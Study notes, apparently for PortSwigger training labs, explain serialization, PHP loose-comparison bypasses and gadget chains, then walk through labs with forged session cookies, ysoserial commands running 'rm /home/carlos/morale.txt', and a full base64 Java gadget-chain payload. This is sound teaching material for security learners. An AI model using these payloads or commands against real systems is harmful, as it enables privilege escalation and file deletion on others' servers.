# Insecure deserialization


- <details>
     <summary>What is serialization?</summary>

     ## What is serialization?
     
     
     **Serialization** is the process of converting complex data structures, such as objects and their fields, into a "flatter" format that can be sent and received as a sequential stream of bytes. Serializing data makes it much simpler to:
     
     -   Write complex data to inter-process memory, a file, or a database
     -   Send complex data, for example, over a network, between different components of an application, or in an API call
     
     Crucially, when serializing an object, its state is also persisted. In other words, the object's attributes are preserved, along with their assigned values.
     



     
</details>




<details>
     <summary>Deserialization</summary>


![image](https://dock12.sorint.com/images/19-04-2023/deserialization-diagram.jpg)


## **`Serialized Data`**


From **`Object`** → **`String`**

> ### you will see in reqest 


## **`DeSerialized Data`**

From **`string`** → **`Object`**

> ### you don't see it it's in server



----


❗ Example showing the picture:
===================

🎯 Before Serialization (Object in the server):
-----------------------------------------


```js
array(
  "id" => 10,
  "admin" => true
)
```


🎯 After Serialization (string appears as Cookie):
------------------------------------------------

```java
a:2:{s:2:"id";i:10;s:5:"admin";b:1;}
```


🔥 Here **string → Serialized**\
🔥 Once the server receives it and returns it, Object → **Deserialized** (and you will not see it)



----

> ### Example on json

**`Object`**

```js
const user = { name: "frank", role: "user" };
```

**`String`**

```json
{"name":"frank","role":"user"}
```


This is **Serialized JSON string**\
It means just **Text** not Object.

In order to return Object, you must do:

```js
let obj = JSON. parse('{"name":"frank","role":"user"}');
```

And vice versa:

```js 
JSON.stringify({ name: "frank", role: "user" });
```



---

---



🎯 The real question:

===================

**How ​​do I know that the site is deserializing the data I see?**

======================================================================================

Answer yourself with 3 questions:

❓ 1) Does the data you see look serialized?

-----------------------------------------

If yes → there is a high probability that the site will deserialize.

❓ 2) Is the data listed in Cookie/Request and changed when I log in?

--------------------------------------------------------------

If Ah → This is Session Serialization.

❓ 3) If I changed the value... the site had different behavior?

------------------------------------------------------

like:

-   I remained admin

- An error occurred

- There was a crash

-   Logging out happened

If Ah → then it really does **deserialization**.








## PHP serialization format

<img width="1108" height="800" alt="image" src="https://github.com/user-attachments/assets/495c1224-41be-4fc2-bd09-908bd6f0491d" />


## Java serialization format

<img width="1117" height="353" alt="image" src="https://github.com/user-attachments/assets/31e2f31d-4217-4a74-89d0-cbb9994cccf0" />







     
     
</details>


<details>
     <summary>Modifying data types</summary>


1) A quick background on Loose Comparison in PHP

=============================================

-   PHP, when you compare two values ​​using `==` (non-strict comparison or **Loose Comparison**), tries to convert the types to each other if they differ.

-   A simple example:

`5 == "5"  // true  `

Because PHP converts string `"5"` to an integer 5 before comparing.

* * * * *


2) A very important point:

==================

If a string begins with a number and is followed by letters, PHP **converts** all the text to just the first number and ignores the rest.

example:

`5 == "5 of something"  // true  `

Because PHP converts `5 of something` → only the number 5, and 5 == 5 is true.


3) Strange case in PHP 7.x and below:
==============================

`0 == "Example string" // true `

This is because PHP converts the string that does not start with a number to 0 digitally!\
In PHP 8 this statement was changed and is now `false`.


4) How is this related to Insecure Deserialization?
===============================================

If there is a code like this:

`$login = unserialize($_COOKIE['login']); if ($login['password'] == $password) { // Allow login } `

* * * * *

Scenario:
----------

- The server expects `password` to be a string (eg "mypassword").

- The attacker changes the cookie and sends a serialized object with `password` as 0 (integer).

- When the server unserializes, the following happens:

`$login['password'] = 0; // Type int, not string `

-And the comparison here:

`0 == "mypassword"`

In PHP 7.x and lower → **equals true**!\
Because `"mypassword"` turns to 0.

* * * * *

The result?
========

The attacker is able to bypass the password **due to a weakness in the non-strict comparison**, which appears because:

- The deserialization returns the original type (int 0) and not string.

- The code depends on the comparison `==`, which converts types.

* * * * *

5) Important notes:
================

- If the code takes the password directly from the request (for example from POST) as a string, instead of taking it from the object after unserialize, the condition will be:

`"0" == "mypassword" // false `

Because the two types and string are different.


8) A final point about modifying data in a serialized string
====================================================

If you change a data type from string to int in a serialized string, you must modify the length of the string and the number of characters associated with the data type in serialized, otherwise unserialize will fail.

for example:

`s:4:"1234"; // string length is 4`

If you convert it to an integer:

`i:1234; // int, no length ` is required

You must be precise for unserialize to work.








     
</details>




<details>
     <summary>Gadget chains</summary>


🔥 What does Gadget Chain mean in Insecure Deserialization?
======================================================================

When there is an application that **deserialize** data coming from the user (which is dangerous if there is no validation), the attacker can send it objects that are crafted in a way that makes the program run certain code without what it intended.

Here comes the role of **the Gadget Chain**.

* * * * *


🔗 What is the Gadget Chain?
==========================

✔️ Gadget = A piece of code that already exists
----------------------------------

An "adget" is a **method already present in the application or library** that the program uses for certain events.

The attacker does not write new code...\
*It just exploits a code that already exists*.

* * * * *


✔️ Gadget Chain = Linking several pieces of code together
---------------------------------------

Each gadget alone may not be harmful...\
But when you connect them together in the form of a chain:

**Magic Method → ​​Gadget → Gadget → Sink Gadget**

In the end, you can reach **Sink Gadget**, which does something dangerous, such as:

- Execute OS commands

- Writing to files

- Make HTTP requests

- Or data leak

* * * * *


🧠 What's the whole idea?
======================

⚡ **You have no control over the code**\
⚡ **But you have control over the Serialized Object that is decoded**\
⚡ When it deserializes, the server itself will run these gadgets\
⚡ Without what he means

The attacker does nothing but construct the object in a specific way.

* * * * *

🧲 Kick-off Gadget (First Spark)
===================================

This is the most important step:
It is a **magic method** that is executed automatically at the time of deserialization.

like:

- `__wakeup()` in PHP

- `readObject()` in Java

- `__destruct()`

- `__call()`

- `__invoke()`

This is the beginning of the next series of gadgets.

* * * * *


🔥 A simple example to illustrate Gadget Chain
=============================================

Imagine a class that does log:

- He takes input

- He throws it to another method

- The next thing you do is process

- In the end, write to a file

If the attacker was able to pass an object in such a way that its data would traverse the entire string...\
Finally, he connects to write-to-file and writes anything he wants.

* * * * *

📦 Ok, where are Gadget Chains ready?
=====================================

Here comes the role of tools like:

✔️ **ysoserial** (for Java)
---------------------------

The most famous tool that generates serialized payloads is based on ready-made gadget chains found in well-known libraries such as:

- Apache Commons Collections

-Spring

- Groovy

-Hibernate

- JSON

-And others

for him?\
Because the same library that contains gadgets is present on thousands of websites...\
If the gadget chain works on one site, it will likely work on another site that uses the same library.


⚙️ How does ysoserial work?
=========================

You choose:

- Library (CommonsCollections1, CC7...)

- The thing you want to do

- It shows you the ready serialized object

for example:

`java -jar ysoserial-all.jar CommonsCollections5 "touch /tmp/hacked" > payload.ser `

Then I sent it to the server that has deserialization vulnerability.

* * * * *


🧱 Why does Java 16+ need additional commands?
===================================

Because of **strong encapsulation** used in Java 16+:\
Some internal classes are not accessible from tools such as ysoserial.

You must open it by adding:

`--add-opens`

As it is written:

`java -jar ysoserial-all.jar\
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED\
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED\
  ...`

Purpose:\
Open the internal packages so that the gadget chain works.


🎯 Conclusion, boss
==================

- gadget chain = methods chain that already exists

- The attacker only controls the data

- magic methods start the chain

-ysoserial generates ready-made strings for you

- Java 16 You need to open the packages for ysoserial to work

















     
</details>


































































---

# **`Labs`**




<details>
  <summary>Lab: Modifying serialized objects `php 7.x` </summary>

1. login as `wiener`
2. intercept the request of `/my-account`

<img width="707" height="621" alt="image" src="https://github.com/user-attachments/assets/4277d372-f554-4646-8b6e-ea389fb9d546" />

```
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
```

3. send cookie to decoder found

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}%3d
```

4. now try to change **`b:0`** to **`b:1`** from false to true
 
<img width="1460" height="634" alt="image" src="https://github.com/user-attachments/assets/f1465f17-e624-4fa0-8456-fbb483a8a3c2" />

```
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}%3d
```

<img width="1102" height="428" alt="image" src="https://github.com/user-attachments/assets/b6e40c36-3938-4f69-89d6-0815ba9c3fd9" />

5. now visit admin panal and delete carlos

```
/admin/delete?username=carlos
```

<img width="1421" height="793" alt="image" src="https://github.com/user-attachments/assets/cef09826-e1ec-41af-af50-7804bb31a5a6" />


  
</details>


<details>
     <summary>Lab: Modifying serialized data types</summary>


1. login as **`wiener`**
2. look at the cookie after login 

<img width="1910" height="860" alt="image" src="https://github.com/user-attachments/assets/d56998c4-ec23-4d1e-9dee-04478a69910f" />

```json
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"wunlak899krb4ov0lwgbhct6jx8u5ya2";}
```

3. now  and 

- change `wiener` to `administrator`
- change **`s:6`** to **`s:13`**
- change `s:32:"wunlak899krb4ov0lwgbhct6jx8u5ya2"` To `i:0`


```json
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```


> ## now server will compare the admin token which is stirng with `0` and because this is `php 7` it will  

```
# if token of admin is "kjhsafdkjasdhfjkajkdf"

0 == "kjhsafdkjasdhfjkajkdf" // true

```

<img width="1629" height="703" alt="image" src="https://github.com/user-attachments/assets/7b2fca8c-fef7-4a79-8b44-4bc6e76fb778" />

4. now send request

```http
/admin/delete?username=carlos
```

<img width="1536" height="693" alt="image" src="https://github.com/user-attachments/assets/877ff803-3b99-4048-8300-a1b631ca7e62" />




     
</details>






<details>
     <summary>Lab: Using application functionality to exploit insecure deserialization</summary>


1. login as `wiener`
2. look at `cookie`


<img width="1872" height="699" alt="image" src="https://github.com/user-attachments/assets/ddf98426-6e5d-4d03-a724-a6792a3c484b" />


```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"e7wnsqdqe9j3kew3t81j1y6v04ljlb3x";s:11:"avatar_link";s:19:"users/wiener/avatar";}
```

3. wen want to delete **`/home/carlos/morale.txt`** we will :

- change **`avatar_link`** To **`/home/carlos/morale.txt`**
- after that delete the account

```
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"e7wnsqdqe9j3kew3t81j1y6v04ljlb3x";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

```
Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJlN3duc3FkcWU5ajNrZXczdDgxajF5NnYwNGxqbGIzeCI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
```



<img width="1797" height="703" alt="image" src="https://github.com/user-attachments/assets/5d70c367-abd9-4fb3-a67d-9d434d635ef5" />




     
</details>



<details>
     <summary>Lab: Arbitrary object injection in PHP</summary>


1. login as **`wiener`**
2. notice the sitemap there is file call **`CustomTemplate.php`**

<img width="627" height="217" alt="image" src="https://github.com/user-attachments/assets/28021447-066d-472f-98de-0b809d277e25" />

3. send it to repeater and to se sourse code add **`~`** to file name

<img width="1723" height="762" alt="image" src="https://github.com/user-attachments/assets/5c573a63-95c1-4583-bd7d-40e2629f4446" />

```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);               // this line
        }
    }
}

?>
```

4. In the source code, notice the `CustomTemplate` class contains the `__destruct()` magic method. This will invoke the `unlink()` method on the `lock_file_path` attribute, which will delete the file on this path.

5. In Burp Decoder, use the correct syntax for serialized PHP data to create a `CustomTemplate` object with the `lock_file_path` attribute set to `/home/carlos/morale.txt`. Make sure to use the correct data type labels and length indicators. The final object should look like this:

```json
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

```
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ0K
```

6.  Send a request containing the session cookie to Burp Repeater.
7.  In Burp Repeater, replace the session cookie with the modified one in your clipboard.
8.  Send the request. The `__destruct()` magic method is automatically invoked and will delete Carlos's file.



<img width="1557" height="641" alt="image" src="https://github.com/user-attachments/assets/daf1c9c1-bd17-4010-b71b-78b6138a6a30" />




     
</details>





<details>
     <summary>Lab: Exploiting Java deserialization with Apache Commons</summary>


1.  Log in to your own account and observe that the session cookie contains a serialized Java object. Send a request containing your session cookie to Burp Repeater.

<img width="1502" height="629" alt="image" src="https://github.com/user-attachments/assets/f51c2fde-3932-4cc2-b44c-daecbec5df8b" />



2.  Download the "ysoserial" tool and execute the following command. This generates a Base64-encoded serialized object containing your payload:

```java
java \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64

```


<img width="1123" height="616" alt="image" src="https://github.com/user-attachments/assets/2b364214-328a-43c5-9092-30bdb2ae82c6" />

```json
rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBh
cmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9u
cy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjM
AgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMv
Y29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0
aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29y
Zy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVy
MMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVj
dGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25z
NC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29s
bGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25z
dGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5p
bnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUu
Y29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+k
htA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGph
dmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFz
cgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVz
SW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVj
b2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFf
b3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tb
Qkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAABqzK/rq+AAAAMgA5CgADACIH
ADcHACUHACYBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4B
AAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRh
YmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2Vy
aWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9y
bQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9z
dW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxl
cjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0
Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2Vy
aWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3Vu
L29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUv
eG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwv
aW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1
TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdo
YW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp
YWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5
c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20v
c3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5z
bGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50
ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9H
YWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUo
KUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAacm0gL2hvbWUvY2FybG9zL21vcmFsZS50
eHQIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAy
ADMKACsANAEADVN0YWNrTWFwVGFibGUBABx5c29zZXJpYWwvUHduZXIxMTQxOTA3NzU1MzI5AQAe
THlzb3NlcmlhbC9Qd25lcjExNDE5MDc3NTUzMjk7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIA
CAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAALwAOAAAADAABAAAA
BQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAANAAOAAAAIAADAAAA
AQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAA
AAGxAAAAAgANAAAABgABAAAAOAAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQAC
AAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVex
AAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgAfAAAB1Mr+ur4AAAAy
ABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx
5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZh
cmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXls
b2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcA
GgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVj
dAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0
cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwAB
sQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAW
ABAACXB0AARQd25ycHcBAHh1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAF2
cgAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXMAAAAAAAAAAAAAAHhwdwQAAAADc3IAEWph
dmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyV
HQuU4IsCAAB4cAAAAAFxAH4AKXg=
```


3.  In Burp Repeater, replace your session cookie with the malicious one you just created. Select the entire cookie and then URL-encode it.
4.  Send the request to solve the lab.

<img width="1469" height="866" alt="image" src="https://github.com/user-attachments/assets/6589b854-2587-4c7b-9bf4-03ef7240382c" />


![Uploading image.png…]()





     
</details>




























